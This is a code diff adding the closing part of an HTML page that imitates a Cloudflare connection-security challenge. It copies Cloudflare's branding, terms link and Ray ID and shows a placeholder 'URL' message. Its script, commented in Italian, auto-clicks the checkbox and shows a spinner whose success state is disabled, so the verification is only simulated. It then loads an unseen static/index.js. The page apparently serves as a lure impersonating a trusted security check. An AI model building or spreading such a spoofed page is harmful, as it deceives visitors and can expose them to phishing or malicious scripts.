+                                <a class="link" target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/website-terms/">Terms</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="ojimE8" class="core-msg spacer spacer-top">URL needs to review the security of your connection before proceeding.</div>
+            </div>
+            <div class="footer" role="contentinfo">
+                <div class="footer-inner">
+                    <div class="clearfix diagnostic-wrapper">
+                        <div class="ray-id">Ray ID:
+                            <code>9aa58257fd76e378</code>
+                        </div>
+                    </div>
+                    <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=m" target="_blank">Cloudflare</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+    <script>
+        // Detect current mode based on system preference
+        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        const mainWrapper = document.querySelector('.main-wrapper');
+
+        // Apply the detected mode
+        if (prefersDark) {
+            mainWrapper.classList.remove('light-mode');
+            mainWrapper.classList.add('dark-mode');
+        } else {
+            mainWrapper.classList.remove('dark-mode');
+            mainWrapper.classList.add('light-mode');
+        }
+
+        const currentMode = mainWrapper.classList.contains('dark-mode') ? 'dark' : 'light';
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const checkboxInput = document.getElementById('cf-input');
+            const statusDefault = document.getElementById('status-default');
+            const statusSpinner = document.getElementById('status-spinner');
+            const statusSuccess = document.getElementById('status-success');
+
+            // Rende lo stato iniziale visibile all'avvio (gestito anche via style inline nell'HTML sopra)
+            statusDefault.style.display = 'flex';
+            statusSpinner.style.display = 'none';
+            statusSuccess.style.display = 'none';
+
+            // document.getElementById('success-i').style.visibility = 'visible';
+
+            checkboxInput.addEventListener('change', function() {
+                if (this.checked) {
+                    // 1. Passa allo stato SPINNER
+                    statusDefault.style.display = 'none';
+                    statusSpinner.style.display = 'flex';
+
+                    // 2. Simula il tempo di verifica (es. 1.5 secondi)
+                    // setTimeout(() => {
+                        // 3. Passa allo stato SUCCESSO
+                    //    statusSpinner.style.display = 'none';
+                    //    statusSuccess.style.display = 'flex';
+                    // }, 5500);
+                } else {
+                    // Torna allo stato iniziale se deselezionato
+                    statusDefault.style.display = 'flex';
+                    statusSpinner.style.display = 'none';
+                    statusSuccess.style.display = 'none';
+                }
+            });
+
+            checkboxInput.click();
+        });
+    </script>
+    <script src="static/index.js" type="application/javascript"></script>
+</html>
